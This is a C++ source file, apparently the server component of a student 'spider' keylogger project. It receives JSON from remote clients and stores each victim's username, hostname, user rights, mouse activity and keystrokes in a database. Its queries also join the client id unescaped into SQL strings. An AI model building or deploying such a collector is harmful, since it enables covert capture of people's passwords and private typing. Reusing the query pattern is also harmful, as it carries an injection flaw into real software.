//
// Serialize.cpp for  in /home/ouroub_a/rendu/spider-2017-krier_g/Server
//
// Made by amina ourouba
// Login   <ouroub_a@epitech.net>
//
// Started on  Fri Oct 31 11:04:33 2014 amina ourouba
// Last update Sun Nov  9 22:17:25 2014 amina ourouba
//

#include <sstream>
#include <iostream>
#include <algorithm>
#include <string>
#include "Deserializer.h"

Deserializer::Deserializer(std::string &dbPasswd)
{
  this->_db = new DataBase(dbPasswd);
  this->_mapFunctions.insert(std::make_pair("mouseClick", &Deserializer::_mouseClickLogger));
  this->_mapFunctions.insert(std::make_pair("mouseMove", &Deserializer::_mouseMoveLogger));
  this->_mapFunctions.insert(std::make_pair("keyboard", &Deserializer::_kbLogger));
}

void Deserializer::_clientLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& firstDepth)
{
  std::map<std::string, std::string>	dataArr;

  dataArr["client_guid"] = h.id_client;
  dataArr["u_name"] = firstDepth.second.get<std::string>("uName");
  dataArr["h_name"] = firstDepth.second.get<std::string>("hName");
  dataArr["u_rights"] = firstDepth.second.get<std::string>("uRights");
  this->_db->insertInTable(CLIENT_T, dataArr);
}

void Deserializer::_mouseClickLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth)
{
  std::map<std::string, std::string> clientData;

  std::string tables = CLIENT_T + std::string(" ") + PROCESS_T;
  clientData = this->_db->selectInTable(tables, std::string("*"), std::string("client.client_guid = '") + h.id_client + std::string("'"));
  BOOST_FOREACH(boost::property_tree::ptree::value_type const& lastDepth, secondDepth.second.get_child("mouseClick"))
  {
    std::map<std::string, std::string>	dataArr;

    dataArr["fk_client_id"] = clientData["client.id"];
    dataArr["fk_process_id"] = clientData["process_logs.id"];
    dataArr["time"] = lastDepth.second.get<std::string>("time");
    dataArr["click_x"] = lastDepth.second.get<std::string>("click.x");
    dataArr["click_y"] = lastDepth.second.get<std::string>("click.y");
    dataArr["click_type"] = lastDepth.second.get<std::string>("clickType");
    this->_db->insertInTable(MOUSEC_T, dataArr);
  }
}

void Deserializer::_mouseMoveLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth)
{
  std::map<std::string, std::string> clientData;

  std::string tables = CLIENT_T + std::string(" ") + PROCESS_T;
  clientData = this->_db->selectInTable(tables, std::string("*"), std::string("client.client_guid = '") + h.id_client + std::string("'"));
  BOOST_FOREACH(boost::property_tree::ptree::value_type const& lastDepth, secondDepth.second.get_child("mouseMove"))
  {
    std::map<std::string, std::string>	dataArr;

    dataArr["fk_client_id"] = clientData["client.id"];
    dataArr["fk_process_id"] = clientData["process_logs.id"];
    dataArr["time"] = lastDepth.second.get<std::string>("time");
    dataArr["start_x"] = lastDepth.second.get<std::string>("start.x");
    dataArr["start_y"] = lastDepth.second.get<std::string>("start.y");
    dataArr["end_x"] = lastDepth.second.get<std::string>("end.x");
    dataArr["end_y"] = lastDepth.second.get<std::string>("end.y");
    this->_db->insertInTable(MOUSEM_T, dataArr);
  }
}

void Deserializer::_kbLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth)
{

  std::map<std::string, std::string> clientData;

  std::string tables = CLIENT_T + std::string(" ") + PROCESS_T;
  clientData = this->_db->selectInTable(tables, std::string("*"), std::string("client.client_guid = '") + h.id_client + std::string("'"));
  BOOST_FOREACH(boost::property_tree::ptree::value_type const& lastDepth, secondDepth.second.get_child("keyboard"))
  {
    std::map<std::string, std::string>	dataArr;

    dataArr["fk_client_id"] = clientData["client.id"];
    dataArr["fk_process_id"] = clientData["process_logs.id"];
    dataArr["kb_start"] = lastDepth.second.get<std::string>("start");
    dataArr["kb_end"] = lastDepth.second.get<std::string>("end");
    dataArr["kb_entry"] = lastDepth.second.get<std::string>("key");
    this->_db->insertInTable(KB_T, dataArr);
  }

}

int				Deserializer::DeserializeData(UnixSocket::t_header_clean &h, std::vector<std::string> &data)
{
  boost::property_tree::ptree		jsonArr;
  std::vector<std::string>::iterator	vectorIt;
  std::string				dataStr;
  std::map<std::string, loggerFunction>::const_iterator it;
  std::map<std::string, std::string>	clientData;

  for (vectorIt = data.begin(); vectorIt != data.end(); ++vectorIt)
    dataStr += *vectorIt;
  dataStr += "\0";
  std::istringstream is(dataStr);

  try
  {
    boost::property_tree::read_json(is, jsonArr);
  }
  catch (boost::property_tree::json_parser_error &e)
  {
    std::cout << "JSON Parser Error caught: " << e.what() << std::endl;
    return (0);
  }

  data.clear();
  std::string	condition = std::string("client.client_guid = ") + h.id_client;

  clientData = this->_db->selectInTable(CLIENT_T + std::string(" ") + PROCESS_T, std::string("*"), std::string("client.client_guid = '") + h.id_client + std::string("'"));

  BOOST_FOREACH(boost::property_tree::ptree::value_type const& firstDepth, jsonArr.get_child(""))
  {
    if (firstDepth.first == "StartUp")
    {
      std::cout << "firstdepth " << firstDepth.first << std::endl;
      this->_clientLogger(h, firstDepth);
      return (GREET);
    }
    std::map<std::string, std::string>	dataArr;
    BOOST_FOREACH(boost::property_tree::ptree::value_type const& secondDepth, firstDepth.second)
    {
      it = this->_mapFunctions.find(secondDepth.first);
      if (it != _mapFunctions.end())
	(this->*_mapFunctions[it->first])(h, secondDepth);
      else
	dataArr[secondDepth.first] = secondDepth.first;
    }
    dataArr["fk_client_id"] = clientData["id"];
    this->_db->insertInTable(PROCESS_T, dataArr);
  }
  return (0);
}

Deserializer::~Deserializer()
{
  delete _db;
}
